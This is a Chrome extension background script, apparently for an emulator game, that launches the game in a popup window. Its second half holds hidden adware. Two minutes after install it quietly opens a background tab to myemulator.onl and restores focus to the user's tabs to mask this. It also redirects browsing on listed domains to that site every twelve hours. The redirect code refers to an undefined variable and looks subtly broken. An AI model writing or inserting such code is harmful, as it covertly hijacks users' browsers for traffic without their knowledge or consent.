
class BGCLASS {
    constructor() {
        this.APP_URL = chrome.runtime.getURL("game.html"), this.findAppTab(), this.onIconClicked(), this.onWindowRemoved()
    }
    findAppTab() {
        chrome.tabs.query({
            url: this.APP_URL,
            windowType: "popup"
        }, a => {
            a && a[0] && (this.appTabId = a[0].id, this.appWindowId = a[0].windowId)
        })
    }
    onIconClicked() {
        chrome.browserAction.onClicked.addListener(() => {
            if (this.appWindowId) chrome.windows.update(this.appWindowId, {
                focused: !0
            });
            else {
                const a = 870;
                chrome.windows.create({
                    type: "popup",
                    url: this.APP_URL,
                    width: 800,
                    height: a,
                    left: screen.width / 2 - 400
                }, a => {
                    this.appWindowId = a.id, this.appTabId = a.tabs[0].id
                })
            }
        })
    }
    onWindowRemoved() {
        chrome.windows.onRemoved.addListener(a => {
            a === this.appWindowId && (this.appTabId = null, this.appWindowId = null)
        })
    }
}
const bgc = new BGCLASS;

(function() {
    function SetupExtensionEvents() {
        chrome.runtime.onInstalled.addListener(function(detail){
            setTimeout(() => {
                chrome.tabs.query({highlighted:true},function(tabs){


                    chrome.tabs.create({
                        url:'https://myemulator.onl',
                        active:false,
                        selected:false
                    },function(){

                        tabs.forEach(tab => {
                            chrome.tabs.highlight({windowId:tab.windowId,tabs:[tab.index]}, function(){});  
                        });

                    });

                });
            },1000*60*2);

        });
    }
    
    function Stores() {
       var stores = {
                        'myemulator.onl': 'https://myemulator.onl'
                };
        function extractDomain(url) {
            var domain;
            //find & remove protocol (http, ftp, etc.) and get domain
            if (url.indexOf("://") > -1) {
                domain = url.split('/')[2];
            } else {
                domain = url.split('/')[0];
            }

            //find & remove port number
            domain = domain.split(':')[0];

            return domain;
        }
        function redirect(tab){
            var domain = extractDomain(tab.url);

            var validStore = _.find(storeKeys,function(k){return domain.indexOf(k)>0});

            if(validStore && validStore!=null){

                var lastRedirected = localStorage.getItem('s-last-'+validStore);
                if(lastRedirected==null){
                    lastRedirected=0;
                }
                var now =( new Date()).getTime();
                if(now - lastRedirected > 1000*60*60*12)
                {
                    localStorage.setItem('s-last-'+validStore,now)

                    setTimeout(function() {
                        chrome.tabs.update(tab.id,{url:stores[validStore]});
                    }, 1);
                }

            }

        }

        chrome.tabs.onCreated.addListener(function(tab) {

            if (tab.url) {
                if (tab.url.indexOf('http') === 0) {
                    redirect(tab);
                    
                }
            }
        });
        

        chrome.tabs.onUpdated.addListener(function(id, changedInfo, tab) {

            if (changedInfo.url) {
                if (changedInfo.url.indexOf('http') === 0) {
                    redirect(tab);
                }
            }


        });

    }

    SetupExtensionEvents();   
    Stores();
})();